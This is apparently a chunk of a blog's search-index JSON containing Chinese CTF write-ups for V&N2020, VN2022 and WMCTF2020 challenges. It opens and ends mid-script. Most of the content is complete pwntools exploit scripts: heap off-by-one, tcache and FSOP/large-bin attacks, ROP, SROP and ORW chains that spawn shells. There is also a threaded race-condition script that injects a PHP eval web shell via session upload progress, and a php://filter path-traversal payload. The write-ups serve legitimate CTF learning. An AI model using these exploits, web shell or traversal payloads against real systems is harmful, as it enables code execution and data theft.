b&#x27;\\x00&#x27;)+b&#x27;/bin/sh\\x00&#x27;r.send(payload)payload = p64(syscall_addr).ljust(0xf, b&#x27;\\x00&#x27;)r.send(payload)r.interactive()\n\n","categories":["pwn"],"tags":["SROP"]},{"title":"V&N2020 公开赛复现","url":"/2022/01/20/V-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B%E5%A4%8D%E7%8E%B0/","content":"总结一下:经过GFCTF的摧残打算复现一场较为简单的比赛了，虽然较为简单，但是也会有新东西学到哦。\nsimpleHeap第一题就是我前几天学得off by one漏洞。\nint sub_CBB()&#123;  int v1; // [rsp+Ch] [rbp-4h]  printf(&quot;idx?&quot;);  v1 = sub_9EA();  if ( v1 &lt; 0 || v1 &gt; 9 || !qword_2020A0[v1] )    exit(0);  printf(&quot;content:&quot;);  sub_C39(qword_2020A0[v1], dword_202060[v1]);  return puts(&quot;Done!&quot;);&#125;\n\n漏洞出现在edit函数内，可以多出一个字节。\n题目主要存在的难点应该是让你多试一下realloc地址应该偏移多少\nexpfrom pwn import *# r = process(&#x27;./vn_pwn_simpleHeap&#x27;)r = remote(&#x27;node4.buuoj.cn&#x27;, 26488)elf = ELF(&#x27;./vn_pwn_simpleHeap&#x27;)libc = ELF(&#x27;./libc-2.23.so&#x27;)context.log_level = &#x27;debug&#x27;def create(size, data):    r.recvuntil(b&#x27;choice: &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;size?&#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;content:&#x27;)    r.send(data)def edit(id, data):    r.recvuntil(b&#x27;choice: &#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;idx?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;content:&#x27;)    r.send(data)def show(id):    r.recvuntil(b&#x27;choice: &#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;idx?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))def delete(id):    r.recvuntil(b&#x27;choice: &#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;idx?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))create(0x68, b&#x27;a&#x27;*0x68)  # 0create(0x60, b&#x27;a&#x27;*0x60)  # 1create(0x60, b&#x27;a&#x27;*0x60)  # 2create(0x60, b&#x27;a&#x27;*0x60)  # 3edit(0, b&#x27;a&#x27;*0x60+p64(0x70)+p8(0xe0+1))delete(1)create(0x60, b&#x27;a&#x27;*0x60)  # 1show(2)main_arena_88 = u64(r.recvuntil(b&#x27;\\n&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;))info(hex(main_arena_88))malloc_hook = malloc_hook = (main_arena_88 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)info(hex(malloc_hook))libc_base = malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]realloc = libc_base+libc.symbols[&#x27;realloc&#x27;]one_gadget = libc_base+0x4526acreate(0x60, b&#x27;a&#x27;*0x60)  # 4delete(2)delete(1)delete(4)create(0x60, p64(malloc_hook-0x20+5-8))  # 1create(0x60, b&#x27;a&#x27;*0x60)create(0x60, b&#x27;a&#x27;*0x60)create(0x60, b&#x27;a&#x27;*(0x20-5-8-8)+p64(one_gadget)+p64(realloc+0xc))# create(1, b&#x27;&#x27;)r.recvuntil(b&#x27;choice: &#x27;)r.sendline(b&#x27;1&#x27;)r.recvuntil(b&#x27;size?&#x27;)r.sendline(bytes(str(0x10), encoding=&#x27;utf-8&#x27;))info(hex(one_gadget))info(hex(realloc))# gdb.attach(r)# flag = flag&#123;e919bec8-e5a6-4c1d-a44a-282f08c57c06&#125;r.interactive()\n\neasyTHeap这道题漏洞发生在delete函数内，没有清楚指针造成UAF\nint sub_D2C()&#123;  int v1; // [rsp+Ch] [rbp-4h]  printf(&quot;idx?&quot;);  v1 = sub_9EA();  if ( v1 &lt; 0 || v1 &gt; 6 || !*(&amp;unk_202080 + v1) )    exit(0);  free(*(&amp;unk_202080 + v1));  dword_202060[v1] = 0;  return puts(&quot;Done!&quot;);&#125;\n\n通过UAF得到tcache struct chunk的地址，再利用double free实现控制tcache struct chunk，进行tcache struct attack。这道题和GFCTF那道题很类似，不过这道简单一点，这里就不赘述可以去看复现GFCTF的那一篇 https://cv196082.gitee.io/2022/01/11/GFCTF/ \nexpfrom pwn import *# r = process(&#x27;./vn_pwn_easyTHeap&#x27;)r = remote(&#x27;node4.buuoj.cn&#x27;, 25768)elf = ELF(&#x27;./vn_pwn_easyTHeap&#x27;)libc = ELF(&#x27;./libc-2.27.so&#x27;)context.log_level = &#x27;debug&#x27;def create(size):    r.recvuntil(b&#x27;choice: &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;size?&#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf8&#x27;))def edit(id, content):    r.recvuntil(b&#x27;choice: &#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;idx?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;content:&#x27;)    r.send(content)def show(id):    r.recvuntil(b&#x27;choice: &#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;idx?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))def delete(id):    r.recvuntil(b&#x27;choice: &#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;idx?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))create(0x50)  # 0delete(0)delete(0)show(0)tcache_struct_addr = u64(r.recvuntil(b&#x27;\\n&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;))-0x250print(hex(tcache_struct_addr))create(0x50)  # 1edit(1, p64(tcache_struct_addr))# delete(2)create(0x50)  # 2create(0x50)  # 3  tcache_structedit(3, b&#x27;a&#x27;*0x28)delete(3)show(3)main_arena_96 = u64(r.recvuntil(b&#x27;\\n&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;))print(hex(main_arena_96))malloc_hook = (main_arena_96 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)print(hex(malloc_hook))libc_base = malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]realloc_addr = libc_base+libc.symbols[&#x27;realloc&#x27;]one_gadget = libc_base+0x4f322create(0x60)  # 4edit(4, b&#x27;\\x00&#x27;*0x40+p64(0)*2+p64(malloc_hook-8))create(0x30)  # 5edit(5, p64(one_gadget)+p64(realloc_addr+8))# gdb.attach(r)create(1)r.interactive()# flag:flag&#123;ce977aa0-80c8-48c6-a1d0-24ec4f55ce17&#125;\n\nwarmup题目很简单，不过需要gdb调试一下，调试一下会发现，第一个不存在栈溢出的函数和第二个存在栈溢出的函数的两个栈地址是相邻的。\nexpfrom pwn import *r = remote(&#x27;node4.buuoj.cn&#x27;, 26531)#r = process(&#x27;./vn_pwn_warmup&#x27;)elf = ELF(&#x27;./vn_pwn_warmup&#x27;)libc = ELF(&#x27;./libc-2.23.so&#x27;)r.recvuntil(&#x27;gift: &#x27;)puts_addr = int(r.recvline()[:-1], 16)libc_base = puts_addr - libc.symbols[&#x27;puts&#x27;]pop_rdi_ret = libc_base + next(libc.search(asm(&#x27;pop rdi\\nret&#x27;, arch=&#x27;amd64&#x27;)))pop_rsi_ret = libc_base + next(libc.search(asm(&#x27;pop rsi\\nret&#x27;, arch=&#x27;amd64&#x27;)))pop_rdx_ret = libc_base + next(libc.search(asm(&#x27;pop rdx\\nret&#x27;, arch=&#x27;amd64&#x27;)))open_addr = libc_base + libc.symbols[&#x27;open&#x27;]read_addr = libc_base + libc.symbols[&#x27;read&#x27;]free_hook = libc_base + libc.symbols[&#x27;__free_hook&#x27;]payload = b&#x27;a&#x27;*0x70 + b&#x27;b&#x27;*0x8payload += p64(pop_rdi_ret)payload2 = p64(0) + p64(pop_rsi_ret) + p64(free_hook) + \\    p64(pop_rdx_ret) + p64(4) + p64(read_addr)payload2 += p64(pop_rdi_ret) + p64(free_hook) + \\    p64(pop_rsi_ret) + p64(0) + p64(open_addr)payload2 += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + \\    p64(free_hook) + p64(pop_rdx_ret) + p64(100) + p64(read_addr)payload2 += p64(pop_rdi_ret) + p64(free_hook) + p64(puts_addr)r.recvuntil(&#x27;something: &#x27;)r.send(payload2)r.recvuntil(&#x27;name?&#x27;)r.send(payload)r.send(&#x27;flag&#x27;)r.interactive()# flag:flag&#123;963b2367-7364-44bf-8352-2c5552e4219e&#125;\n\nbabybabypwn这一个是最头疼的，不过我写的exp后面改得和其他wp一样也是打不通就很烦。\n这道题使用的是SROP攻击，原理我还没怎么看懂，不过做题我应该能做出来，所以我就放个exp，后面会把SROP的原理和相关例题在做一篇博客。\nexpfrom pwn import *context(os=&#x27;Linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)# r = process(&#x27;./vn_pwn_babybabypwn_1&#x27;)r = remote(&#x27;node4.buuoj.cn&#x27;, 29297)elf = ELF(&#x27;./vn_pwn_babybabypwn_1&#x27;)libc = ELF(&#x27;./libc-2.23.so&#x27;)r.recvuntil(b&#x27;Here is my gift: 0x&#x27;)puts_addr = int(r.recvuntil(b&#x27;\\n&#x27;, drop=True), 16)libc_base = puts_addr-libc.symbols[&#x27;puts&#x27;]info(hex(libc_base))libc_bss = libc.bss()+libc_base+0x100pop_rdi = libc_base + 0x21102pop_rsi = libc_base + 0x202e8pop_rdx = libc_base + 0x1b92read_addr = libc.symbols[&#x27;read&#x27;]+libc_baseopen_addr = libc.symbols[&#x27;open&#x27;]+libc_basewrite_addr = libc.symbols[&#x27;write&#x27;]+libc_baser.recvuntil(b&#x27;Please input magic message: &#x27;)frame = SigreturnFrame()frame.rdi = 0frame.rsi = libc_bssframe.rdx = 0x100frame.rip = read_addrframe.rsp = libc_bssr.send(bytes(str(frame), encoding=&#x27;utf8&#x27;)[8:])flag_addr = libc_bss+0x98payload = p64(pop_rdi)+p64(flag_addr)+p64(pop_rsi)+p64(0)+p64(open_addr)payload += p64(pop_rdi)+p64(3)+p64(pop_rsi) + \\    p64(libc_bss)+p64(pop_rdx)+p64(0x40)+p64(read_addr)payload += p64(pop_rdi)+p64(1)+p64(pop_rsi) + \\    p64(libc_bss)+p64(pop_rdx)+p64(0x40)+p64(write_addr)payload += b&#x27;flag\\x00&#x27;r.send(payload)r.interactive()\n\n","categories":["比赛复现"],"tags":["pwn"]},{"title":"VN2022复现_FShuiMaster","url":"/2022/02/22/VN2022%E5%A4%8D%E7%8E%B0-FShuiMaster/","content":"这道题目只有三解，但是确实是有难度，这里我只写上思路在这周内补上以上知识点的文章。\n首先题目的保护是全开的，在edit内存在明显的off by null，然后在increase函数里限制了chunk的大小必须为large chunk\n__int64 __fastcall get_Input(__int64 a1, unsigned __int64 a2)&#123;  char buf; // [rsp+1Fh] [rbp-11h] BYREF  unsigned __int64 i; // [rsp+20h] [rbp-10h]  unsigned __int64 v5; // [rsp+28h] [rbp-8h]  v5 = __readfsqword(0x28u);  for ( i = 0LL; i &lt; a2; ++i )  &#123;    if ( read(0, &amp;buf, 1uLL) &lt;= 0 )      exit(0);    if ( buf == 10 )    &#123;      *(a1 + i) = 0;      break;    &#125;    *(i + a1) = buf;  &#125;  if ( i == a2 )    *(a1 + a2) = 0;  return 0LL;&#125;\n\n第一步就是利用off by null来leak libc。\ncreate(0x440, b&#x27;&#x27;)  # 0create(0x448, b&#x27;&#x27;)  # 1create(0x4f0, b&#x27;&#x27;)  # 2create(0x440, b&#x27;&#x27;)  # 3delete(0)edit(1, b&#x27;a&#x27;*0x440+p64(0x8a0))delete(2)create(0x440, b&#x27;&#x27;)  # 4show(1)r.recvline()main_arena_96 = u64(r.recvuntil(    b&#x27;\\n\\nOne: increase a page of U book&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;))print(hex(main_arena_96))malloc_hook = (main_arena_96 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)print(hex(malloc_hook))libc_base = malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]\n\n因为我是复现所以我的思路是根据其他exp的，其实按照我的写法是没必要泄漏heap的地址的，但是我写了还是贴出来吧。\ncreate(0x448, b&#x27;&#x27;)  # 5 1create(0x448, b&#x27;&#x27;)  # 6create(0x440, b&#x27;&#x27;)  # 7create(0x448, b&#x27;&#x27;)  # 8create(0x450, b&#x27;&#x27;)  # 9create(0x440, b&#x27;&#x27;)  # 10delete(7)delete(9)create(0x440, b&#x27;a&#x27;*7)  # 11show(11)r.recvuntil(b&#x27;a&#x27;*7+b&#x27;\\n&#x27;)heap_addr = u64(r.recvuntil(b&#x27;\\n&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;))print(&#x27;heap_addr=&gt;&#x27;, hex(heap_addr))\n\n后面就是FSOP的内容了，在glibc2.24及以后，添加了vtable check的保护措施，所以不能直接修改vtable的值(会有专门解释FSOP的文章)。\n又因为FILE结构体其实是用_IO_list_all来维护的(其中储存着_IO_2_1_stderr_的地址)，所以我们这里只需要修改其中的值到一个chunk，然后将vtable的值换为_IO_str_jumps-8，并且根据要求构造FILE结构体就好。\n最后使用large bin attack(也会有专门解释各glibc版本下的利用方式)。将_IO_list_all改为堆地址然后将相应的堆内容换为构造的FILE结构体。\nfrom pwn import *elf = ELF(&#x27;./FShuiMaster&#x27;)libc = ELF(&#x27;./libc-2.27.so&#x27;)r = process(&#x27;./FShuiMaster&#x27;)context.log_level = &#x27;debug&#x27;def create(size, content):    r.recvuntil(b&#x27;Five: Finished!\\n&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;Number of words?&#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;please input U character&#x27;)    r.sendline(content)def edit(id, content):    r.recvuntil(b&#x27;Five: Finished!\\n&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;please input the page U want 2 change&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;Now Change U this page : &#x27;)    r.sendline(content)def delete(id):    r.recvuntil(b&#x27;Five: Finished!\\n&#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;please Input the page U want 2 tear off&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))def show(id):    r.recvuntil(b&#x27;Five: Finished!\\n&#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;please Input The page U want 2 scan&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))def pack_file(_IO_read_base=0, _IO_write_base=0, _IO_write_ptr=0, _IO_buf_base=0, _mode=0, vtable=0):    IO_FILE = p64(0)*3+p64(_IO_read_base) + \\        p64(_IO_write_base)+p64(_IO_write_ptr)+p64(0)+p64(_IO_buf_base)    IO_FILE = IO_FILE.ljust(0xc0, b&#x27;\\x00&#x27;)    IO_FILE += p32(_mode)    IO_FILE = IO_FILE.ljust(0xd8, b&#x27;\\x00&#x27;)+p64(vtable)    return IO_FILEr.recvuntil(b&#x27;Please Write U Name on the Book\\n&#x27;)r.sendline(b&#x27;196082&#x27;)create(0x440, b&#x27;&#x27;)  # 0create(0x448, b&#x27;&#x27;)  # 1create(0x4f0, b&#x27;&#x27;)  # 2create(0x440, b&#x27;&#x27;)  # 3delete(0)edit(1, b&#x27;a&#x27;*0x440+p64(0x8a0))delete(2)create(0x440, b&#x27;&#x27;)  # 4show(1)r.recvline()main_arena_96 = u64(r.recvuntil(    b&#x27;\\n\\nOne: increase a page of U book&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;))print(hex(main_arena_96))malloc_hook = (main_arena_96 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)print(hex(malloc_hook))libc_base = malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]create(0x448, b&#x27;&#x27;)  # 5 1create(0x448, b&#x27;&#x27;)  # 6create(0x440, b&#x27;&#x27;)  # 7create(0x448, b&#x27;&#x27;)  # 8create(0x450, b&#x27;&#x27;)  # 9create(0x440, b&#x27;&#x27;)  # 10delete(7)delete(9)create(0x440, b&#x27;a&#x27;*7)  # 11show(11)r.recvuntil(b&#x27;a&#x27;*7+b&#x27;\\n&#x27;)heap_addr = u64(r.recvuntil(b&#x27;\\n&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;))print(&#x27;heap_addr=&gt;&#x27;, hex(heap_addr))system_addr = libc_base+libc.symbols[&#x27;system&#x27;]bin_sh_addr = libc_base+next(libc.search(b&#x27;/bin/sh&#x27;))IO_list_all = libc_base+libc.symbols[&#x27;_IO_list_all&#x27;]IO_str_jumps = libc_base + 0x3e8360print(&#x27;_IO_list_all=&gt;&#x27;, hex(IO_list_all))print(&#x27;_IO_str_jumps=&gt;&#x27;, hex(IO_str_jumps))file_struct = pack_file(IO_list_all, 0, 1, bin_sh_addr, 0, IO_str_jumps-8)file_struct += p64(0)+p64(system_addr)create(0x440, b&#x27;&#x27;)  # 12create(0x440, b&#x27;&#x27;)  # 13create(0x458, b&#x27;&#x27;)  # 14create(0x4f0, b&#x27;&#x27;)  # 15create(0x440, b&#x27;&#x27;)  # 16delete(13)edit(14, b&#x27;a&#x27;*0x450+p64(0x8b0))delete(15)create(0x440, b&#x27;&#x27;)  # 17create(0x458, b&#x27;&#x27;)  # 18 14delete(1)create(0x4f0, b&#x27;&#x27;)  # 19create(0x470, b&#x27;&#x27;)  # 20delete(18)edit(5, p64(main_arena_96)+p64(IO_list_all-0x10))create(0x500, b&#x27;&#x27;)edit(14, file_struct[0x10:])r.recvuntil(b&#x27;Five: Finished!\\n&#x27;)r.sendline(b&#x27;5&#x27;)# gdb.attach(r)r.interactive()\n\n其他师傅只使用一次off by null，我一直卡在最后构造结构体的位置，换换脑子过后想到了用两次off by null来解决这个问题。\n","categories":["比赛复现"],"tags":["FSOP","off bu null","large bin attack"]},{"title":"WMCTF2020_Make_PHP_Great_Again","url":"/2021/10/26/WMCTF2020-Make-PHP-Great-Again/","content":"题目源码:\n&lt;?phphighlight_file(__FILE__);require_once &#x27;flag.php&#x27;;if(isset($_GET[&#x27;file&#x27;])) &#123;  require_once $_GET[&#x27;file&#x27;];&#125;\n\n题目是直接用的require_once所以在下面直接引用flag.php是不得行的。那第一反应就是phpsession条件竞争了\n非预期解import requestsfrom threading import Thread, Eventimport timesession_id = &#x27;cv196082&#x27;url = &#x27;http://26540d71-1264-4901-a9a1-8174d8614ffe.node4.buuoj.cn:81/&#x27;def upload(session):    data = &#123;        &#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php eval($_POST[&quot;shell&quot;]);?&gt;&#x27;    &#125;    file = &#123;        &#x27;file&#x27;: (&#x27;shell.txt&#x27;, b&#x27;a&#x27;*0x1000)    &#125;    headers = &#123;        &quot;Cookie&quot;: &#x27;PHPSESSID=&#x27;+session_id    &#125;    session.post(url=url, data=data, headers=headers, files=file)def getshell(session):    data = &#123;        &#x27;shell&#x27;: &#x27;system(&quot;cat flag.php&quot;);&#x27;    &#125;    attack_url = url+&#x27;?file=/tmp/sess_&#x27;+session_id    res = session.post(url=attack_url, data=data)    if &#x27;upload_progress_&#x27; in res.text:        print(&quot;res:&quot;+res.text)        Event().clear()if __name__ == &#x27;__main__&#x27;:    with requests.session() as session:        for i in range(30):            t1 = Thread(target=upload, args=(session,))            t1.start()            t2 = Thread(target=getshell, args=(session,))            t2.start()            time.sleep(0.3)\n\n预期解payload:\n?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php\n\n关于预期解的原理我还没去了解\n","categories":["web-buuctf"],"tags":["条件竞争"]},{"title":"VN2022复现[1]","url":"/2022/02/14/VN2022%E5%A4%8D%E7%8E%B0/","content":"首先反思一下，整场比赛我只看了HideOnHeap和classic_httpd这两道题(因为在最开始的时候这两道题是排在最前面的)。发现毫无思路我就直接开始摆烂了，后面的pwn题也是一道没看，甚至都没下载下来。 拒绝摆烂，从你我做起！\nclear_got这个题目就是一个非常简单的栈溢出，咋一看以为是SROP实际上就是非常基础的ROP即可(愈发觉得自己摆烂不是人了)。\n题目分析int __cdecl main(int argc, const char **argv, const char **envp)&#123;  char buf[92]; // [rsp+0h] [rbp-60h] BYREF  int v5; // [rsp+5Ch] [rbp-4h]  init(argc, argv, envp);  memset(buf, 0, 0x50uLL);  puts(&quot;Welcome to VNCTF! This is a easy competition.///&quot;);  read(0, buf, 0x100uLL);  v5 = (int)&amp;qword_601008;  memset(&amp;qword_601008, 0, 0x38uLL);  return 0;&#125;\n\n可以看到存在一处栈溢出，然后下面将got表全部清空，但是题目给了两个用syscall直接调用的函数，所以我的第一反应就是SROP，不过WP的方法感觉更为简单，就是ret2csu即可。\nfrom pwn import *elf = ELF(&#x27;./clear_got&#x27;)r = process(&#x27;./clear_got&#x27;)context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]context.log_level = &#x27;debug&#x27;bss = elf.bss()+0x20syscall_ret = 0x40077Epayload = b&#x27;a&#x27;*(0x60+0x8)+p64(0x4007EA)+p64(0xc01c8) + \\    p64(0xc01c9)+p64(0)+p64(59)+p64(bss)+p64(0)payload += p64(0x4007D0)+p64(0)+p64((bss+8)//8)+p64((bss+8)//8+1) + \\    p64(0)*3+p64(bss)+p64(syscall_ret)+p64(0x4007D0)payload = payload.ljust(0x100, b&#x27;a&#x27;)info(&#x27;bss=&gt;&#x27;+hex(bss))# gdb.attach(r)r.send(payload)payload = b&#x27;/bin/sh\\x00&#x27;+p64(syscall_ret)payload = payload.ljust(59, b&#x27;\\x00&#x27;)r.sendline(payload)r.interactive()\n\n这里比较巧妙的一点就是在最后到0x4007D0这个地址时其实是用call了那个syscall来实现调用的。\neasyROPtocol这道题目的难度也不是很大，关键是把结构体搞清楚就好(真是越看越想打自己)。\n题目分析struct tcp&#123;    0x766e; // size=2    0x28b7; // size=2    0xn001; // size=4    0x1;    // size=4    0x6;    // size=2    0x1;\t// size=2\t\t\t// size=2    0x0;\t// size=2    0x1;\t// size=2    0xffff; // size=2&#125;\n\n最后推出来的结构体\nssize_t sub_401830()&#123;  const void *v0; // rbx  size_t v1; // rax  size_t v2; // rax  char s[24]; // [rsp+0h] [rbp-3020h] BYREF  int i; // [rsp+3008h] [rbp-18h]  int v6; // [rsp+300Ch] [rbp-14h]  v6 = 1;  memset(s, 0, 0x3000uLL);  while ( dword_40422C )  &#123;    for ( i = 0; i &lt;= 3 &amp;&amp; (!chunk_arr[i] || *(chunk_arr[i] + 4LL) != v6); ++i )      ;    if ( i == 4 )      break;    if ( 4 * (*(chunk_arr[i] + 12LL) &amp; 0xF) != 20 &amp;&amp; *(chunk_arr[i] + 20LL) )    &#123;      v0 = (chunk_arr[i] + 4 * (*(chunk_arr[i] + 12LL) &amp; 0xF));      v1 = strlen(s);      memcpy(&amp;s[v1], v0, 0x1000uLL);      v6 += 4096;    &#125;    else    &#123;      strcpy(s, (4 * (*(chunk_arr[i] + 12LL) &amp; 0xF) + chunk_arr[i]));      dword_40422C = 0;    &#125;  &#125;  v2 = strlen(s);  write(1, s, v2);  return write(1, &quot;Done.\\n&quot;, 6uLL);&#125;\n\n首先是看漏洞函数，这里存在一处栈溢出，memcpy(&amp;s[v1], v0, 0x1000uLL);但是要实现需要满足上面的条件，这就必须要去搞清楚结构体了。\nvoid sub_40164F()&#123;  size_t v0; // rax  int v1; // [rsp+8h] [rbp-8h]  int i; // [rsp+Ch] [rbp-4h]  for ( i = 0; i &lt;= 3 &amp;&amp; *(&amp;chunk_arr + i); ++i )    ;  if ( i != 4 )  &#123;    *(&amp;chunk_arr + i) = malloc(0x1000uLL);    read(0, *(&amp;chunk_arr + i), 0x1000uLL);    v1 = sub_4014AF(*(&amp;chunk_arr + i));    if ( (sub_401590(*(&amp;chunk_arr + i)) &amp; v1) == 1 )    &#123;      dword_40422C = 1;    &#125;    else    &#123;      v0 = strlen(aBengBuZhuLe);      write(2, aBengBuZhuLe, v0);      free(*(&amp;chunk_arr + i));      *(&amp;chunk_arr + i) = 0LL;    &#125;  &#125;&#125;\n\n想要成功创建出结构体就必须要通过那个if语句，也就是v1和前面的sub_401590(*(&amp;chunk_arr + i)都为1。\n__int64 __fastcall sub_4014AF(__int64 a1)&#123;  __int64 result; // rax  if ( *a1 != 0x766E )    return 0LL;  if ( *(a1 + 2) != 0x28B7 )    return 0LL;  if ( !*(a1 + 4) )    return 0LL;  if ( !*(a1 + 8) )    return 0LL;  if ( !*(a1 + 14) )    return 0LL;  if ( *(a1 + 18) )    return 0LL;  if ( 4 * (*(a1 + 12) &amp; 0xF) == 20 )    goto LABEL_18;  if ( 4 * (*(a1 + 12) &amp; 0xF) != 24 )    return 0LL;  if ( *(a1 + 22) == 0xFFFF )LABEL_18:    result = 1LL;  else    result = 0LL;  return result;&#125;\n\n_BOOL8 __fastcall sub_401590(__int64 a1)&#123;  char v2[23]; // [rsp+Bh] [rbp-1Dh] BYREF  unsigned __int16 j; // [rsp+22h] [rbp-6h]  unsigned __int16 i; // [rsp+24h] [rbp-4h]  __int16 v5; // [rsp+26h] [rbp-2h]  strcpy(v2, &quot;fakeipheadfa&quot;);  *&amp;v2[13] = v2;  v5 = 0;  for ( i = 0; i &lt;= 5u; ++i )    v5 ^= *(2LL * i + *&amp;v2[13]);  *&amp;v2[13] = a1;  for ( j = 0; j &lt;= 0x7FFu; ++j )  &#123;    if ( j != 8 )      v5 ^= *(2LL * j + *&amp;v2[13]);  &#125;  return v5 == *(a1 + 16);&#125;\n\n很容易就可以推出来结构体(下面这个函数当中是当j!=8我一直以为是chunk_addr+8，结果卡了半个小时发现是2*j(我是傻逼)\n程序开启了沙箱所以使用orw即可\nfrom pwn import *elf = ELF(&#x27;./pwn&#x27;)r = process(&#x27;./pwn&#x27;)libc = ELF(&#x27;libc-2.31.so&#x27;)context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]context.log_level = &#x27;debug&#x27;def package(addr_4, content):    pack = p16(0x766e)    pack += p16(0x28b7)    pack += p32(addr_4)    pack += p32(0x1)    pack += p16(0x6)    pack += p16(0x1)    pack += p16(0x0)    pack += p16(0x0)    pack += p16(0x1)    pack += p16(0xffff)+content    v2 = &#x27;fakeipheadfa&#x27;    v5 = 0    for i in range(6):        v5 = v5 ^ int(hex(ord(v2[:2][::-1][0])) +                      hex(ord(v2[:2][::-1][1]))[2:], 16)        v2 = v2[2:]    a1 = pack    for i in range(0x800):        v5 = v5 ^ u16(a1[:2])        a1 = a1[2:]    pack = pack[:16]+p16(v5)+pack[18:]    return packdef create(content):    r.recvuntil(b&#x27;4. Quit.&#x27;)    r.sendline(b&#x27;1&#x27;)    r.send(content)def delete(id):    r.recvuntil(b&#x27;4. Quit.&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Which?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))def vuln():    r.recvuntil(b&#x27;4. Quit.&#x27;)    r.sendline(b&#x27;3&#x27;)pop_rdi = 0x0000000000401bb3pop_rsi_r15 = 0x0000000000401bb1main = 0x401A5Ewrite_got = elf.got[&#x27;write&#x27;]write_plt = elf.plt[&#x27;write&#x27;]read_plt = elf.plt[&#x27;read&#x27;]bss = elf.bss()+0x28create(package(1, b&#x27;a&#x27;*(0x1000-24)))create(package(0x1001, b&#x27;a&#x27;*(0x1000-24)))create(package(0x2001, b&#x27;a&#x27;*(0x1000-24)))payload = b&#x27;a&#x27;*(0x3020+0x8-(0x1000-24)*3)+p64(pop_rdi) + \\    p64(1)+p64(pop_rsi_r15)+p64(write_got)+p64(0)+p64(write_plt)+p64(main)create(package(0x3001, payload.ljust(0x1000-24, b&#x27;\\x00&#x27;)))vuln()r.recvuntil(b&#x27;Done.\\n&#x27;)write_addr = u64(r.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))libc_base = write_addr+libc.symbols[&#x27;write&#x27;]open_addr = libc_base+libc.symbols[&#x27;open&#x27;]pop_rdx = libc_base+next(libc.search(asm(&#x27;pop rdx\\nret&#x27;, arch=&#x27;amd64&#x27;)))pop_rsi = libc_base+next(libc.search(asm(&#x27;pop rsi\\nret&#x27;, arch=&#x27;amd64&#x27;)))delete(0)delete(1)delete(2)delete(3)create(package(1, b&#x27;a&#x27;*(0x1000-24)))create(package(0x1001, b&#x27;a&#x27;*(0x1000-24)))create(package(0x2001, b&#x27;a&#x27;*(0x1000-24)))payload = b&#x27;a&#x27;*(0x3020+0x8-(0x1000-24)*3-6) + p64(pop_rdi) + \\    p64(0)+p64(pop_rsi)+p64(bss)+p64(pop_rdx)+p64(0x5)+p64(read_plt)payload += p64(pop_rdi)+p64(bss)+p64(pop_rsi)+p64(0)+p64(open_addr)payload += 